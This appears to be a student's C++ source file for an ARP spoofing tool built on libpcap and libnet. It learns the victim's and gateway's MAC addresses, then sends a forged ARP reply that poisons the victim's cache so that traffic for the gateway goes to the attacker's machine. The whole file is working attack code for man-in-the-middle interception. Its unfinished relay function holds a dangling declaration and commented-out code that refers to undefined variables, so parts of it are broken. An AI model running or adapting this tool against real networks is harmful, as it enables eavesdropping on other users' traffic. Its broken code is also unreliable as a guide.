#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <net/if.h>
#include <stdio.h>
#include <cstring>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct packet_hdr{
    struct libnet_ethernet_hdr eth;
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
    uint8_t* data;
};

char hackerMAC[30] = {0, };
char hackerIP[30] = {0, };
char senderMAC[30] = {0, };
char targetMAC[30] = {0, };

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void getIP(char* IP){
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    }
    else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                  IP,sizeof(struct sockaddr));
    }
}

void getMac(char* MAC, char** argv){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    char temp[3];   // ':' '%x' '%x' temporary arr

    strcpy(s.ifr_name, argv[1]);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; ++i) {
            sprintf(temp, "%02x:", (unsigned char)s.ifr_addr.sa_data[i]);
            strcpy(MAC+ i * 3, temp);   // copy into main MAC arr
        }
        MAC[17] = '\0';     // if not xx:xx:xx:xx: => get rid of last ':'
    }
}

// searching victim's MAC address
void getSenderMac(char** argv, pcap_t* handle, char* targetMAC, char* hackerMAC, char* hackerIP){
    EthArpPacket ethpacket;
    char temp[10];

    ethpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    ethpacket.eth_.smac_ = Mac(hackerMAC); // hacker MAC
    ethpacket.eth_.type_ = htons(EthHdr::Arp);
    ethpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    ethpacket.arp_.pro_ = htons(EthHdr::Ip4);
    ethpacket.arp_.hln_ = Mac::SIZE;
    ethpacket.arp_.pln_ = Ip::SIZE;
    ethpacket.arp_.op_ = htons(ArpHdr::Request);
    ethpacket.arp_.smac_ = Mac(hackerMAC); // hacker MAC
    ethpacket.arp_.sip_ = htonl(Ip(hackerIP)); // hacker IP
    ethpacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    ethpacket.arp_.tip_ = htonl(Ip(argv[2]));// victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ethpacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // collect target MAC address
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        // if arp header 0806
        if (((uint8_t)packet[12] == 0x08) && ((uint8_t)packet[13] == 0x06)){
            for (int i = 0; i < 6; i++) {
                sprintf(temp, "%02x:", packet[i + 6]);
                strcpy(targetMAC + i * 3, temp);
            }
            targetMAC[17] = '\0';   // if not xx:xx:xx:xx: => get rid of last :
            break;
        }
    }
}

void getTargetMac(char** argv, pcap_t* handle, char* targetMAC, char* hackerMAC, char* hackerIP){
    EthArpPacket ethpacket;
    char temp[10];

    ethpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    ethpacket.eth_.smac_ = Mac(hackerMAC); // hacker MAC
    ethpacket.eth_.type_ = htons(EthHdr::Arp);
    ethpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    ethpacket.arp_.pro_ = htons(EthHdr::Ip4);
    ethpacket.arp_.hln_ = Mac::SIZE;
    ethpacket.arp_.pln_ = Ip::SIZE;
    ethpacket.arp_.op_ = htons(ArpHdr::Request);
    ethpacket.arp_.smac_ = Mac(hackerMAC); // hacker MAC
    ethpacket.arp_.sip_ = htonl(Ip(hackerIP)); // hacker IP
    ethpacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    ethpacket.arp_.tip_ = htonl(Ip(argv[3]));// victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ethpacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // collect target MAC address
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        // if arp header 0806
        if (((uint8_t)packet[12] == 0x08) && ((uint8_t)packet[13] == 0x06)){
            for (int i = 0; i < 6; i++) {
                sprintf(temp, "%02x:", packet[i + 6]);
                strcpy(targetMAC + i * 3, temp);
            }
            targetMAC[17] = '\0';   // if not xx:xx:xx:xx: => get rid of last :
            break;
        }
    }
}

// ARP Poisoning
void spoof(char** argv, pcap_t* handle, char* targetMAC, char* hackerMAC){
    EthArpPacket ethpacket;
    ethpacket.eth_.dmac_ = Mac(targetMAC); // victim MAC
    ethpacket.eth_.smac_ = Mac(hackerMAC); // me hacker MAC
    ethpacket.eth_.type_ = htons(EthHdr::Arp);
    ethpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    ethpacket.arp_.pro_ = htons(EthHdr::Ip4);
    ethpacket.arp_.hln_ = Mac::SIZE;
    ethpacket.arp_.pln_ = Ip::SIZE;
    ethpacket.arp_.op_ = htons(ArpHdr::Reply);
    ethpacket.arp_.smac_ = Mac(hackerMAC); // me hacker MAC
    ethpacket.arp_.sip_ = htonl(Ip(argv[3])); // gateway
    ethpacket.arp_.tmac_ = Mac(targetMAC); // victim MAC
    ethpacket.arp_.tip_ = htonl(Ip(argv[2]));// victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ethpacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    printf("Poisoned! \n");
}

void relay(char** argv, pcap_t* handle, char* gatewayMAC, char* hackerMAC, char* hackerIP){
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct packet_hdr hdr_pack;
        memcpy(&hdr_pack.eth, packet, LIBNET_ETH_H);
        memcpy(&hdr_pack.ip, packet + LIBNET_ETH_H, LIBNET_IPV4_H);
        memcpy(&hdr_pack.tcp, packet + LIBNET_ETH_H+LIBNET_IPV4_H, LIBNET_TCP_H);

        char
        /*
        struct packet_hdr pk_hdr;
        memcpy(&(pk_hdr.eth), packet1, LIBNET_ETH_H);
        memcpy(&(pk_hdr.ip), packet1 + LIBNET_ETH_H, LIBNET_IPV4_H);
        memcpy(&(pk_hdr.tcp), packet1 + LIBNET_ETH_H+LIBNET_IPV4_H, LIBNET_TCP_H);
        memcpy(&(pk_hdr.data), packet1 + LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pk_hdr.tcp.th_off, header->caplen - (LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pk_hdr.tcp.th_off));

        uint8_t tpsmac[6], tptmac[6], tpamac[6];
        memcpy(tpsmac, pk_hdr.eth.ether_shost, sizeof(tpsmac));
        memcpy(tpamac, pk_hdr.eth.ether_dhost, sizeof(tpamac));
        char smac1[20], dmac1[20];

        int i;
        for(i=0; i<5; i++){
            sprintf(&smac1[i*3], "%02X:", tpsmac[i]);
            sprintf(&dmac1[i*3], "%02X:", tpamac[i]);
        }
        sprintf(&smac1[i*3], "%02X", tpsmac[i]);
        sprintf(&dmac1[i*3], "%02X", tpamac[i]);
        for(i=0;i<6;i++){
            if(64 < dstmac[i*3]) tptmac[i] = (dstmac[i*3] - 55) * 16;
            else 				 tptmac[i] = (dstmac[i*3] - 48) * 16;

            if(64 < dstmac[i*3+1]) tptmac[i] += (dstmac[i*3+1] - 55);
            else 				   tptmac[i] += (dstmac[i*3+1] - 48);
        }
        if(memcmp(dstmac, dmac1, sizeof(attmac))==0) break; // arp table ended

        if( memcmp(srcmac, smac1, sizeof(srcmac))==0 && memcmp(attmac, dmac1, sizeof(attmac))==0 && ntohs(pk_hdr.eth.ether_type) == ETHERTYPE_IP){
            memcpy(pk_hdr.eth.ether_shost, tpamac, sizeof(tpamac));
            memcpy(pk_hdr.eth.ether_dhost, tptmac, sizeof(tptmac));
            int res = pcap_sendpacket(handle, (const u_char*)(&pk_hdr), sizeof(pk_hdr));
            if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            else puts("Reply Sending...");
        }
    }
    pcap_close(handle);
        */
    }

}
int main(int argc, char** argv) {
    if (argc != 4) {
        usage();
        return -1;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    getIP(hackerIP);
    getMac(hackerMAC, argv);
    printf("Hacker IP >> %s\n", hackerIP);
    printf("Hacker MAC >> %s\n", hackerMAC);

    getSenderMac(argv, handle, senderMAC, hackerMAC, hackerIP);
    getTargetMac(argv, handle, targetMAC, hackerMAC, hackerIP);
    printf("%s\n", senderMAC);
    printf("%s\n", targetMAC);
    spoof(argv, handle, senderMAC, hackerMAC);
    // relay(argv, handle, targetMAC, hackerMAC, hackerIP);

    pcap_close(handle);

    return 0;
}
